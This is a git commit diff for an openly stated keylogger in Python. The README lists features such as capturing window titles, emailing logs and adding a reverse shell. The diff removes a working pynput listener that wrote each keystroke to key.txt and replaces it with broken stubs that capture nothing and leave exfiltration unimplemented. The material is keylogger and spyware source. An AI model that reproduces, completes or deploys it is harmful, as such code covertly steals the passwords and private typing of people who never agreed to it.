3f1b31958bd04a653e6048d45310c1720a3117c3
kaytee <mountaqua500@gmail.com>
2023-10-18 21:16:39 +1100

    basic stuff

--- README.md
+++ README.md
@@ -8,4 +8,4 @@
 - capturing active window titles,
 - sending logs via email or secure file transfer. 
 - save into file, send as backups to email or web services
-- differnt operating systems
+- reverse shell
--- keylogger.py
+++ keylogger.py
@@ -1,15 +1,42 @@
-from pynput  import keyboard;
+from pynput import keyboard
+import logging
 
-def keyPressed(key):
-    print(key)
-    with open("key.txt", 'a') as file: 
-        try:
-            char = key.char
-            file.write(char)
-        except:
-            print('failed on', key)
+
+def key_press(key):
+    count = 0
+    keys = []
+    
+    readToFile(keys)
+    
+
+
+
+def readToFile(keys):
+    # if keys.length:
+    #     return
+    
+    with open ("key.txt", 'a') as file:
+        for key in keys:
+            file.write(key)
+            
+    
+    
+    
+    
+def takeTimeStamp():
+    print('')
+
+def getCompSpecs(): 
+    print('')
+    
+def sendFile():
+    print('')    
+
+
+
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keyPressed)
+    listener = keyboard.Listener(on_press=key_press)
     listener.start()
+    readToFile([])
     input()
